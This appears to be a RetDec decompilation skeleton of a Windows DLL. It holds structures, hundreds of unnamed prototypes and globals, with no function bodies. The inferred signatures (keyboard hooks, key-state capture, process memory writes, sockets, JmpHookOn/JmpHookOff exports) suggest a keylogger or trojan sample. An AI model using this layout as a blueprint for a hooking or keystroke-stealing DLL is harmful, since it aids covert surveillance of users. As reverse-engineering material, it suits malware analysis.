//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <windows.h>

// ----------------- Float Types Definitions ------------------

typedef float float32_t;
typedef double float64_t;
typedef long double float80_t;

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

// ------------------- Function Prototypes --------------------

int32_t DllCanUnloadNow(void);
int32_t DllGetClassObject(int32_t a1);
int32_t DllRegisterServer(void);
int32_t DllUnregisterServer(void);
int32_t entry_point(void);
int32_t function_401000(void);
int32_t function_40110f(void);
int32_t function_401117(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType);
bool function_40111f(int32_t * hLibModule);
char * function_401127(void);
int32_t function_40112f(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData);
void function_401137(struct _STARTUPINFOA * lpStartupInfo);
int32_t function_40113f(void);
int32_t function_401147(int32_t a1);
int32_t function_40114f(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, char * a6, int32_t a7);
int32_t function_401157(int32_t a1);
int32_t function_40115f(int16_t ** pbstr, int16_t * psz, int32_t len);
void function_401167(int16_t * bstrString);
int32_t function_40116f(void);
int32_t function_401177(void);
bool function_40117f(struct _LARGE_INTEGER * lpPerformanceCount);
int32_t function_401187(void);
int32_t function_40118f(void);
int32_t function_4011b3(void);
int32_t function_4011bb(void);
int32_t * function_4011c3(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect);
bool function_4011cb(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType);
void function_4011d3(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_4011db(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_4011e3(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_4011eb(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
int32_t function_4011f3(int32_t a1, int32_t a2);
int32_t function_401243(void);
int32_t function_40124b(void);
int32_t function_40127b(void);
int32_t function_401293(void);
int32_t function_401303(void);
int32_t function_401397(void);
int32_t function_4013fb(void);
int32_t function_401473(void);
int32_t function_40152b(void);
int32_t function_4015bf(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40163f(int32_t a1);
int32_t function_4016cf(int32_t a1, int32_t a2);
int32_t function_4017f3(void);
int32_t function_40187f(int32_t a1);
int32_t function_401935(void);
int32_t function_40193a(void);
int32_t function_40193c(int32_t a1);
int32_t function_401943(void);
int32_t function_401a23(void);
int32_t function_401a87(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401ab7(void);
int32_t function_401ae7(void);
int32_t function_401b0b(void);
int32_t function_401b33(void);
int32_t function_401ba3(void);
int32_t function_401bdb(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401c8b(void);
int32_t function_401d13(void);
int32_t function_401d5f(void);
int32_t function_401deb(void);
int32_t function_401e17(void);
int32_t function_401e4b(void);
int32_t function_401e77(void);
int32_t function_401f6b(void);
int32_t function_4020e7(void);
int32_t function_4020ec(void);
int32_t function_4020ee(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_4020fb(void);
int32_t function_40228d(void);
int32_t function_402292(void);
int32_t function_402294(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40229f(void);
int32_t function_40247b(int32_t a1);
int32_t function_40252c(void);
int32_t function_402531(void);
int32_t function_402533(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40253f(void);
int32_t function_40255f(void);
int32_t function_40257f(void);
int32_t function_4025cf(void);
int32_t function_4025da(void);
int32_t function_4025db(void);
int32_t function_402622(int32_t a1, int32_t a2);
int32_t function_402627(int32_t a1);
int32_t function_402632(void);
int32_t function_402633(int32_t a1, int32_t a2);
int32_t function_402643(void);
int32_t function_402683(void);
int32_t function_4026ab(void);
int32_t function_4026bb(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4026c3(void);
int32_t function_40271b(void);
int32_t function_402737(void);
int32_t function_4027a7(void);
int32_t function_4027c7(void);
int32_t function_402827(int32_t a1, int32_t a2);
int32_t function_402833(void);
int32_t function_402907(void);
int32_t function_402913(void);
int32_t function_402937(int32_t nTypeFlag);
int32_t function_40293f(void);
int32_t function_40296f(void);
int32_t function_402a06(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18);
int32_t function_402aeb(int32_t a1);
int32_t function_402b0b(int32_t a1, int32_t a2);
int32_t function_402b3b(void);
int32_t function_402b43(void);
int32_t function_402b47(void);
int32_t function_402b4b(void);
int32_t function_402b4f(void);
int32_t function_402b75(void);
int32_t function_402b77(void);
int32_t function_402ba0(void);
int32_t function_402ba5(int32_t a1);
int32_t function_402bc7(void);
int32_t function_402bcf(void);
int32_t function_402bdf(void);
int32_t function_402bef(void);
int32_t function_402c0b(void);
int32_t function_402c2f(int32_t a1, int32_t a2);
int32_t function_402c47(int32_t a1);
int32_t function_402c5b(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402c7b(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_402ca3(void);
int32_t function_402cbf(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402cdf(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402e0b(int32_t a1, int32_t a2);
int32_t function_402e43(int32_t a1);
int32_t function_402e97(int32_t a1);
int32_t function_402ec6(void);
int32_t function_402ec7(int32_t a1, int32_t result);
int32_t function_402edc(void);
int32_t function_402edf(int32_t a1);
int32_t function_402f7b(int32_t a1);
int32_t function_402f7f(int32_t a1, int32_t a2);
int32_t function_40301f(void);
int32_t function_40303f(void);
int32_t function_403067(void);
int32_t function_4030c7(int32_t a1);
int32_t function_403127(int32_t a1);
int32_t function_4031ee(void);
int32_t function_4031ef(void);
int32_t function_40324b(void);
int32_t function_403278(void);
int32_t function_40327b(void);
int32_t function_403307(void);
int32_t function_4033da(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4033df(void);
int32_t function_4033e9(void);
int32_t function_4033eb(int32_t a1);
int32_t function_4033f6(void);
int32_t function_4033f7(void);
int32_t function_40341b(void);
int32_t function_40344b(void);
int32_t function_40348f(void);
int32_t function_4034bb(void);
int32_t function_4034eb(void);
int32_t function_4034fb(void);
int32_t function_403527(void);
int32_t function_40352b(void);
int32_t function_403535(void);
int32_t function_403537(void);
int32_t function_40354e(void);
int32_t function_40354f(void);
int32_t function_403557(void);
int32_t function_40359b(void);
int32_t function_40360e(void);
int32_t function_40360f(int32_t result);
int32_t function_403698(void);
int32_t function_40369b(void);
int32_t function_40373f(void);
int32_t function_40374f(void);
int32_t function_40375b(void);
int32_t function_40379f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4037a4(void);
int32_t function_4037a7(void);
int32_t function_4037ac(void);
int32_t function_4037af(int32_t * a1);
int32_t function_4037ee(void);
int32_t function_4037ef(void);
int32_t function_403837(void);
int32_t function_403893(void);
int32_t function_4038db(void);
int32_t function_40393f(void);
int32_t function_403946(void);
int32_t function_403947(void);
int32_t function_40395f(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_403983(void);
int32_t function_4039a7(void);
int32_t function_4039db(void);
int32_t function_4039f2(void);
int32_t function_4039f3(void);
int32_t function_403adf(void);
int32_t function_403af6(void);
int32_t function_403af7(void);
int32_t function_403c13(int32_t a1);
int32_t function_403d05(void);
int32_t function_403d07(void);
int32_t function_403d0e(void);
int32_t function_403d0f(void);
int32_t function_403d17(void);
int32_t function_403d1f(int32_t a1);
int32_t function_403d2f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_403d34(void);
int32_t function_403d37(int32_t a1, int32_t a2);
int32_t function_403d3f(int32_t a1);
int32_t function_403ecb(void);
int32_t function_403ed7(void);
int32_t function_403f13(void);
int32_t function_403f3b(void);
int32_t function_403f97(void);
int32_t function_403fa7(void);
int32_t function_40400b(void);
int32_t function_404010(void);
int32_t function_404012(int32_t a1, int32_t a2);
int32_t function_404017(void);
int32_t function_40402f(void);
int32_t function_40405b(void);
int32_t function_4040c1(void);
int32_t function_4040c6(void);
int32_t function_4040c8(int32_t a1);
int32_t function_4040cf(void);
int32_t function_404119(void);
int32_t function_40411e(void);
int32_t function_404120(int32_t a1);
int32_t function_404123(void);
int32_t * function_4041f7(int32_t uFlags, int32_t uBytes);
int32_t * function_4041ff(int32_t * hMem);
int32_t function_404207(void);
bool function_40420f(int32_t dwTlsIndex);
int32_t * function_404217(int32_t dwTlsIndex);
bool function_40421f(int32_t dwTlsIndex, int32_t * lpTlsValue);
int32_t function_404227(void);
int32_t function_404233(int32_t a1);
int32_t function_40423b(void);
int32_t function_40427f(void);
int32_t function_4042ab(void);
int32_t function_4042d3(void);
int32_t function_4042f7(void);
int32_t function_404337(int32_t a1, int32_t a2);
int32_t function_404343(void);
int32_t function_40438b(void);
int32_t function_4043b0(void);
int32_t function_4043b5(void);
int32_t function_4043b7(int32_t a1);
int32_t function_4043bb(void);
int32_t function_4043c3(void);
int32_t function_4043e8(void);
int32_t function_4043ed(void);
int32_t function_4043ef(int32_t a1);
int32_t function_4043f3(void);
int32_t function_4043fb(int32_t * hKey);
int32_t function_404403(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition);
int32_t function_40440b(int32_t * hKey, char * lpSubKey);
int32_t function_404413(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult);
int32_t function_40441b(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData);
int32_t function_404423(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData);
bool function_40442b(int32_t * hObject);
int32_t function_404433(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2);
bool function_40443b(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists);
int32_t * function_404443(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile);
int32_t * function_40444b(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId);
bool function_404453(char * lpFileName);
void function_40445b(int32_t uExitCode);
int32_t * function_404463(int32_t * hModule, char * lpName, char * lpType);
void function_40446b(int32_t * hLibModule, int32_t dwExitCode);
int32_t * function_404473(void);
int32_t function_40447b(int32_t * hFile, int32_t * lpFileSizeHigh);
int32_t function_404483(int32_t * hModule, char * lpFilename, int32_t nSize);
int32_t * function_40448b(char * lpModuleName);
int32_t (*function_404493(int32_t * hModule, char * lpProcName))();
int32_t function_40449b(int32_t nBufferLength, char * lpBuffer);
int32_t function_4044a3(void);
int32_t * function_4044ab(int32_t uFlags, int32_t dwBytes);
int32_t * function_4044b3(int32_t * hMem);
int32_t * function_4044bb(int32_t * hMem);
bool function_4044c3(int32_t * hMem);
int32_t * function_4044cb(char * lpLibFileName);
bool function_4044d3(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped);
bool function_4044db(int32_t * hFile);
void function_4044e3(int32_t dwMilliseconds);
bool function_4044eb(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect);
bool function_4044f3(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped);
bool function_4044fb(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten);
int32_t function_404503(char * lpString1, char * lpString2);
char * function_40450b(char * lpString1, char * lpString2);
bool function_404513(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer);
int32_t * function_40451b(int32_t i);
int32_t * function_404523(int32_t * hdc, int32_t * h);
int32_t function_40452b(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam);
bool function_404533(void);
int32_t function_40453b(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_404543(struct tagMSG * lpMsg);
bool function_40454b(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam);
int32_t * function_404553(char * lpClassName, char * lpWindowName);
int32_t * function_40455b(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow);
bool function_404563(struct tagPOINT * lpPoint);
int32_t function_40456b(int32_t * hWnd, int32_t nIndex);
int32_t function_404573(int32_t * hWnd, char * lpClassName, int32_t nMaxCount);
int32_t * function_40457b(int32_t uFormat);
int32_t * function_404583(int32_t * hWnd);
bool function_40458b(char * lpKeyState);
bool function_404593(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax);
int32_t * function_40459b(int32_t * hWnd);
int32_t * function_4045a3(int32_t * hWnd);
int32_t * function_4045ab(int32_t * hWnd, int32_t uCmd);
int32_t function_4045b3(int32_t * hWnd, int32_t nIndex);
int32_t function_4045bb(int32_t * hWnd, int32_t * lpdwProcessId);
bool function_4045c3(int32_t * hWnd);
bool function_4045cb(int32_t * hWnd);
bool function_4045d3(int32_t * hWnd, int32_t uIDEvent);
int32_t * function_4045db(int32_t * hInstance, char * lpIconName);
bool function_4045e3(int32_t * hWndNewOwner);
bool function_4045eb(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
void function_4045f3(int32_t nExitCode);
int32_t function_4045fb(int32_t * hWnd, int32_t * hDC);
int32_t function_404603(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_40460b(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t));
int32_t function_404613(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong);
int32_t * function_40461b(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId);
int32_t function_404623(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags);
bool function_40462b(int32_t * hhk);
int32_t function_404633(void);
int32_t * function_40463b(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam);
int32_t function_404643(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle);
int32_t function_40469b(void);
int32_t function_4046c0(void);
int32_t function_4046c5(void);
int32_t function_4046c7(int32_t a1);
int32_t function_4046cb(void);
int32_t function_4046d6(void);
int32_t function_404748(void);
int32_t function_40474d(void);
int32_t function_40474f(int32_t a1);
int32_t function_404753(void);
int32_t function_40475b(void);
int32_t function_404797(void);
int32_t function_4047bc(void);
int32_t function_4047c1(void);
int32_t function_4047c3(int32_t a1);
int32_t function_4047c7(void);
int32_t function_4047cf(void);
int32_t function_4047f4(void);
int32_t function_4047f9(void);
int32_t function_4047fb(int32_t a1);
int32_t function_4047ff(void);
int32_t function_404807(int32_t s);
int32_t function_40480f(int32_t s, struct sockaddr * name, int32_t namelen);
int16_t function_404817(int16_t hostshort);
char * function_40481f(struct in_addr in);
int32_t function_404827(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_40482f(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_404837(int32_t af, int32_t type, int32_t protocol);
struct hostent * function_40483f(char * name);
int32_t function_404847(char * name, int32_t namelen);
int32_t function_40484f(int16_t wVersionRequested, struct WSAData * lpWSAData);
int32_t function_404857(void);
int32_t function_40485f(void);
int32_t function_404884(void);
int32_t function_404889(void);
int32_t function_40488b(int32_t a1);
int32_t function_40488f(void);
int32_t function_404a2f(void);
int32_t function_404a54(void);
int32_t function_404a59(void);
int32_t function_404a5b(int32_t a1);
int32_t function_404a5f(void);
int32_t function_404a67(void);
int32_t function_404a8c(void);
int32_t function_404a91(void);
int32_t function_404a93(int32_t a1);
int32_t function_404a97(void);
int32_t * function_404a9f(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd);
int32_t function_404aa7(void);
int32_t function_404acc(void);
int32_t function_404ad1(void);
int32_t function_404ad3(int32_t a1);
int32_t function_404ad7(void);
int32_t function_404adf(void);
int32_t function_404b04(void);
int32_t function_404b09(void);
int32_t function_404b0b(int32_t a1);
int32_t function_404b0f(void);
int32_t function_404b17(void);
int32_t function_404b3c(void);
int32_t function_404b41(void);
int32_t function_404b43(int32_t a1);
int32_t function_404b47(void);
int32_t function_404b4f(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5);
int32_t function_404b57(void);
int32_t function_404b7c(void);
int32_t function_404b81(void);
int32_t function_404b83(int32_t a1);
int32_t function_404b87(void);
int32_t function_404b8f(void);
int32_t function_404ba7(void);
int32_t function_404ccb(void);
int32_t function_404cd0(void);
int32_t function_404cd2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404cf6(void);
int32_t function_404cff(void);
int32_t function_404d6d(void);
int32_t function_404d72(void);
int32_t function_404d74(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_404d7e(void);
int32_t function_404dac(void);
int32_t function_404db1(void);
int32_t function_404db3(int32_t a1);
int32_t function_404db7(void);
int32_t function_404dbf(void);
int32_t function_404e42(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_404f15(void);
int32_t function_404f1a(void);
int32_t function_404f1c(void);
int32_t function_404f20(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_40500f(void);
int32_t function_405034(void);
int32_t function_405039(void);
int32_t function_40503b(int32_t a1);
int32_t function_40503f(void);
int32_t function_405047(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40515b(void);
int32_t function_405160(void);
int32_t function_405162(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40516b(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40522a(void);
int32_t function_40522f(void);
int32_t function_405231(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_405237(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4052b1(void);
int32_t function_4052b6(void);
int32_t function_4052b8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4052bc(void);
int32_t function_405337(int32_t hhk, int32_t nCode, int32_t wParam);
int32_t function_40537f(void);
int32_t function_4053b7(void);
int32_t function_4053cf(void);
int32_t function_4053f4(void);
int32_t function_4053f9(void);
int32_t function_4053fb(int32_t a1);
int32_t function_4053ff(void);
int32_t function_40540a(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40567f(void);
int32_t function_405684(void);
int32_t function_405686(int32_t a1, int32_t a2);
int32_t function_40568f(void);
int32_t function_4056eb(void);
int32_t function_40578f(void);
int32_t function_405794(void);
int32_t function_405796(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40579f(void);
int32_t function_4057ab(void);
int32_t function_40581c(void);
int32_t function_405821(void);
int32_t function_405823(int32_t a1);
int32_t function_40582b(void);
int32_t function_405857(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_405acc(void);
int32_t function_405ad1(void);
int32_t function_405ad3(int32_t a1);
int32_t function_405b9e(void);
int32_t function_405be6(void);
int32_t function_405beb(void);
int32_t function_405bed(int32_t a1);
int32_t function_405bef(void);
int32_t function_405bf7(void);
int32_t function_405d0c(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_405e07(void);
int32_t function_405e3e(void);
int32_t function_405e43(void);
int32_t function_405e45(int32_t a1);
int32_t function_405e47(void);
int32_t function_405e89(void);
int32_t function_405e8e(void);
int32_t function_405e90(int32_t a1);
int32_t function_405e93(void);
int32_t function_405e95(int32_t a1);
int32_t function_405fd6(void);
int32_t function_405fdb(void);
int32_t function_405fdd(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405fee(void);
int32_t function_405ffd(void);
int32_t function_406007(int32_t a1);
int32_t function_406017(void);
int32_t function_40603c(void);
int32_t function_406041(void);
int32_t function_406043(int32_t a1);
int32_t function_406047(void);
int32_t function_40604f(void);
int32_t function_40608a(void);
int32_t function_4060c3(void);
int32_t function_4060e3(void);
int32_t function_4060ef(void);
int32_t function_406117(void);
int32_t function_406137(void);
int32_t function_40615c(void);
int32_t function_406161(void);
int32_t function_406163(int32_t a1);
int32_t function_406167(void);
int32_t function_40616f(void);
int32_t function_406177(void);
int32_t function_406203(void);
int32_t function_406208(void);
int32_t function_40620a(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_406213(void);
int32_t function_40624b(void);
int32_t function_406392(void);
int32_t function_406397(void);
int32_t function_406399(int32_t a1);
int32_t function_4063be(int32_t a1, int32_t a2);
int32_t function_406673(void);
int32_t function_406678(void);
int32_t function_40667a(int32_t a1);
int32_t function_4066a6(void);
int32_t function_4066ae(void);
int32_t function_4066b5(void);
int32_t function_4066f1(void);
int32_t function_4066f3(void);
int32_t function_4067a3(void);
int32_t function_4067d8(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7);
int32_t function_4068f8(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_406b6d(void);
int32_t function_406b72(void);
int32_t function_406b74(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406bab(void);
int32_t function_406caf(void);
int32_t function_406cb4(void);
int32_t function_406cb6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406ceb(void);
int32_t function_406dda(void);
int32_t function_406ddf(void);
int32_t function_406de1(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406deb(void);
int32_t function_406e31(void);
int32_t function_406e36(void);
int32_t function_406e38(int32_t a1);
int32_t function_406e3b(void);
int32_t function_406e7d(void);
int32_t function_406e82(void);
int32_t function_406e84(int32_t a1);
bool function_406e87(char * pszPath);
int32_t function_406e8f(void);
int32_t function_406ecf(int32_t a1, int32_t nIndex);
int32_t function_406fa1(void);
int32_t function_406fa6(void);
int32_t function_406fa8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406fb3(int32_t a1, uint32_t a2, int32_t a3);
int32_t function_40703b(void);
int32_t function_407053(int32_t a1);
int32_t function_40706b(void);
int32_t function_40707f(void);
int32_t function_4070a7(void);
int32_t function_4070db(void);
int32_t function_407113(void);
int32_t function_407153(void);
int32_t function_40718b(void);
int32_t function_4071bb(void);
int32_t function_407235(void);
int32_t function_40723a(void);
int32_t function_40723c(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407247(void);
int32_t function_4072a8(void);
int32_t function_4072ad(void);
int32_t function_4072af(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4072ca(void);
float80_t function_4072d2(void);
int32_t function_4072d7(void);
int32_t function_407356(void);
int32_t function_40735b(void);
int32_t function_40735d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407373(void);
int32_t function_4073cf(void);
int32_t function_4074dc(void);
int32_t function_4074e1(void);
int32_t function_4074e3(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407503(void);
int32_t function_40751b(void);
int32_t function_407587(void);
int32_t function_4075ac(void);
int32_t function_4075b1(void);
int32_t function_4075b3(int32_t a1);
int32_t function_4075b7(void);
int32_t function_4075bf(int32_t nCode, int32_t wParam, int32_t lParam);
int32_t function_407617(void);
int32_t function_40763c(void);
int32_t function_407641(void);
int32_t function_407643(int32_t a1);
int32_t function_407647(void);
int32_t * function_40764f(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size);
int32_t function_407657(void);
int32_t function_40767c(void);
int32_t function_407681(void);
int32_t function_407683(int32_t a1);
int32_t function_407687(void);
int32_t function_407690(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407773(void);
int32_t function_4077bb(int32_t a1);
int32_t function_407873(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407877(void);
int32_t function_40789c(void);
int32_t function_4078a1(void);
int32_t function_4078a3(int32_t a1);
int32_t function_4078a7(void);
int32_t function_4078af(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_4078fb(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40792b(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_4079c3(void);
int32_t function_4079c8(void);
int32_t function_4079ca(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4079da(void);
int32_t function_4079dc(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15);
int32_t function_407b53(void);
int32_t function_407b5b(void);
int32_t function_407b67(void);
int32_t function_407b86(void);
int32_t function_407b8b(void);
int32_t function_407b8d(int32_t a1);
int32_t function_407b8f(void);
int32_t function_407c55(void);
int32_t function_407cc2(int16_t a1);
int32_t function_407f18(void);
int32_t function_407f1d(void);
int32_t function_40e004(int32_t Offset);
int32_t function_40e010(int32_t a1);
int32_t function_40e128(int32_t a1);
int32_t JmpHookOff(void);
int32_t JmpHookOn(void);
int32_t unknown_400fb7(void);
int32_t unknown_400ff9(void);
int32_t unknown_4ec7(void);
int32_t unknown_4f9f(void);
int32_t unknown_635df73a(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 37; // 0x404cfb
int32_t g2 = 62; // 0x405b33
int32_t g3 = 46; // 0x405b97
int32_t g4 = 41; // 0x4063b7
int32_t g5 = 47; // 0x406697
int32_t g6 = 47; // 0x406cdb
int32_t g7 = 0x6f485408; // 0x4076db
int32_t g8 = 0; // 0x408000
int32_t g9 = 0; // 0x408004
int32_t g10 = 0; // 0x408008
int32_t g11 = 0x408d02; // 0x40800c
int32_t g12 = 0; // 0x408010
int32_t g13 = 0; // 0x408014
int16_t g14 = 0x1332; // 0x408018
char g15 = 0; // 0x40801c
char g16 = 0; // 0x408020
char g17 = 0; // 0x408024
int32_t g18 = 0; // 0x408028
int32_t g19 = 0; // 0x40802c
char * g20 = "0123456789ABCDEF\xff\xff\xff\xff"; // 0x408080
int32_t g21 = -1; // 0x408090
int32_t g22 = 0; // 0x408094
int32_t g23 = 0; // 0x408098
int32_t g24 = 0; // 0x40809c
int32_t g25 = 0; // 0x4080a0
char * g26 = "aixiaran\x97H@"; // 0x4080d0
int32_t g27 = 0x408d01; // 0x4080f0
int32_t g28 = 1; // 0x4080f8
int32_t g29 = 0; // 0x408104
int32_t g30 = 0; // 0x408108
char * g31; // 0x40810c
int32_t g32 = 0; // 0x408118
int32_t g33; // 0x40812c
int32_t g34; // 0x408138
int32_t g35; // 0x40813c
int32_t g36; // 0x408140
